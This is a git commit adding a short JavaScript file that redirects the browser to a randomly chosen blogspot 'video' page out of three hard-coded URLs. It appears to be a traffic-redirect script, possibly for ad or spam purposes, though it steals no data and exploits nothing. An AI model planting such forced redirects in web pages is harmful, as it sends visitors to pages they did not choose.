f819258cd652cfdd245deacc413c267159c0f23a
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2023-12-01 20:07:15 +0700

    Create adst2dr2blog.js

---
+++ adst2dr2blog.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+  
+  'https://videoo2121.blogspot.com/2023/11/video_3.html',
+  'https://videoo2121.blogspot.com/2023/11/video.html',
+  'https://videoo2121.blogspot.com/2023/10/video_99.html'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
